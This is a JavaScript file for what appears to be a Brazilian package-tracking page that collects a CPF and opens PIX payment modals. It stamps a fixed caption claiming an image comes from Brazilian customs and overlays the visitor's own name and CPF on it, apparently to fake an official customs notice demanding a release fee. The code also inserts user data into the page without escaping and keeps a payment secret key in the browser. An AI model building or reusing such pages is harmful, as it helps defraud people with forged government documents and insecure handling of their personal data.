/**
 * Script principal da página de rastreamento - Atualizado com sistema aprimorado
 */
import { TrackingSystem } from './src/components/tracking-system.js';
import { Navigation } from './src/components/navigation.js';

(function() {
    'use strict';
    
    console.log('=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===');
    
    let trackingSystem;
    
    function initializeTrackingPage() {
        console.log('=== INICIALIZANDO PÁGINA DE RASTREAMENTO APRIMORADA ===');
        
        try {
            // Inicializar navegação
            Navigation.init();
            console.log('✓ Navegação inicializada');
            
            // Inicializar sistema de rastreamento aprimorado
            if (!trackingSystem) {
                // Verificar se é origem Vega para decidir qual sistema usar
                const urlParams = new URLSearchParams(window.location.search);
                const isVegaOrigin = urlParams.get('origem') === 'vega';
                
                // Usar sistema básico que prioriza a API oficial
                trackingSystem = new TrackingSystem();
                window.trackingSystemInstance = trackingSystem; // Expor globalmente
                console.log('✓ Sistema de rastreamento aprimorado criado');
            }
            
            // Configurar efeito de header no scroll
            setupHeaderScrollEffect();
            console.log('✓ Header scroll configurado');
            
            // Verificar se elementos críticos existem
            verifyElements();
            
            // Configurar API secret se disponível
            configureZentraPayApiSecret();
            
            console.log('=== PÁGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===');
        } catch (error) {
            console.error('❌ Erro na inicialização da página de rastreamento:', error);
            // Tentar novamente após delay
            setTimeout(initializeTrackingPage, 2000);
        }
    }
    
    function configureZentraPayApiSecret() {
        const apiSecret = window.ZENTRA_PAY_SECRET_KEY || 
                         localStorage.getItem('zentra_pay_secret_key');
        
        if (apiSecret && apiSecret !== 'SUA_SECRET_KEY_AQUI' && trackingSystem) {
            trackingSystem.zentraPayService.setApiSecret(apiSecret);
            console.log('✓ API Secret Zentra Pay configurada automaticamente');
        } else {
            console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")');
        }
    }
    
    function verifyElements() {
        const criticalElements = [
            'trackingForm',
            'cpfInput', 
            'trackButton',
            'liberationModal',
            'pixCodeModal',
            'realPixQrCode'
        ];
        
        criticalElements.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                console.log(`✓ Elemento encontrado: ${id}`);
            } else {
                console.warn(`⚠️ Elemento não encontrado: ${id}`);
            }
        });
    }
    
    function setupHeaderScrollEffect() {
        window.addEventListener('scroll', function() {
            const header = document.querySelector('.header');
            if (header) {
                // Manter efeito de vidro consistente
                header.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
                header.style.backdropFilter = 'blur(10px)';
            }
        });
    }
    
    function updateImageCaption() {
        const caption = document.getElementById('imageCaption');
        if (caption) {
            // Usar data e horário fixos da etapa "Alfândega de importação"
            const dateStr = '24/07/2024';
            const timeStr = '08:21';
            
            caption.textContent = `${dateStr} ${timeStr} Anexado pelo sistema de capitalização da fiscalização aduaneira do Brasil`;
        }
        
        // Adicionar overlay com dados do usuário
        addFormDataOverlay();
        
        // Forçar atualização do overlay quando modal for aberto
        const liberationModal = document.getElementById('liberationModal');
        if (liberationModal) {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                        if (liberationModal.style.display === 'flex') {
                            setTimeout(() => {
                                addFormDataOverlay();
                            }, 100);
                        }
                    }
                });
            });
            observer.observe(liberationModal, { attributes: true });
        }
    }
    
    function addFormDataOverlay() {
        // Remover overlay existente se houver
        const existingOverlay = document.querySelector('.form-data-overlay');
        if (existingOverlay) {
            existingOverlay.remove();
        }
        
        const imageContainer = document.querySelector('.payment-image-container');
        if (!imageContainer) return;
        
        // Obter dados do usuário atual
        const userData = window.trackingSystemInstance?.userData;
        if (!userData) {
            console.log('⚠️ Dados do usuário não encontrados para overlay');
            return;
        }
        
        console.log('📝 Criando overlay com dados:', userData);
        
        // Criar overlay
        const overlay = document.createElement('div');
        overlay.className = 'form-data-overlay';
        overlay.style.cssText = `
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 480px;
            pointer-events: none;
            z-index: 10;
            background: transparent;
        `;
        
        overlay.innerHTML = `
            <div class="form-field-overlay field-nome-completo" style="
                position: absolute;
                top: 45%;
                left: 50%;
                transform: translateX(-50%);
                font-family: 'Inter', sans-serif;
                font-size: 14px;
                font-weight: 700;
                color: #000000;
                text-align: center;
                background: rgba(255, 255, 255, 0.9);
                padding: 4px 8px;
                border-radius: 4px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                max-width: 80%;
                word-wrap: break-word;
            ">
                ${userData.nome || 'Nome não encontrado'}
            </div>
            <div class="form-field-overlay field-cpf" style="
                position: absolute;
                top: 55%;
                left: 50%;
                transform: translateX(-50%);
                font-family: 'Inter', sans-serif;
                font-size: 14px;
                font-weight: 700;
                color: #000000;
                text-align: center;
                background: rgba(255, 255, 255, 0.9);
                padding: 4px 8px;
                border-radius: 4px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                max-width: 80%;
                word-wrap: break-word;
            ">
                ${userData.cpf ? userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'CPF não encontrado'}
            </div>
        `;
        
        imageContainer.appendChild(overlay);
        console.log('✅ Overlay criado e adicionado à imagem');
    }
    
    // Múltiplas estratégias de inicialização para garantir funcionamento
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeTrackingPage);
        console.log('📅 Aguardando DOMContentLoaded');
    } else {
        initializeTrackingPage();
        console.log('📄 DOM já carregado, inicializando imediatamente');
    }
    
    // Fallbacks com delays progressivos
    setTimeout(initializeTrackingPage, 100);
    setTimeout(initializeTrackingPage, 500);
    setTimeout(initializeTrackingPage, 1000);
    setTimeout(initializeTrackingPage, 2000);

    console.log('=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===');
})();